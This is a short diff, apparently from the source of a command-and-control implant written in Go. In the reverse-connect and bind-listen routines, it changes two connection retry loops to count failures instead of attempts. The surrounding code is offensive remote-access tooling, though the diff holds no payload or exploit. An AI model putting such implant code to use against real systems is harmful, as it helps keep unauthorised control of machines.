@@ -53,7 +53,7 @@ func (t *C2) startReverse() (err error) {
 	log.Printf("Connecting (reverse) %s <- (%s)", t.uri.Host, t.uri.Scheme)
 	// {{end}}
 
-	for t.attempts < int(t.Profile.MaxConnectionErrors) {
+	for t.failures < int(t.Profile.MaxConnectionErrors) {
 
 		// We might have several transport protocols available, while some
 		// of which being unable to do stream multiplexing (ex: mTLS + DNS):
@@ -178,7 +178,7 @@ func (t *C2) startBind() (err error) {
 	log.Printf("Listening (bind) on %s (%s)", t.uri.Host, t.uri.Scheme)
 	// {{end}}
 
-	for t.attempts < int(t.Profile.MaxConnectionErrors) {
+	for t.failures < int(t.Profile.MaxConnectionErrors) {
 		switch t.uri.Scheme {
 
 		// {{if .Config.MTLSc2Enabled}}
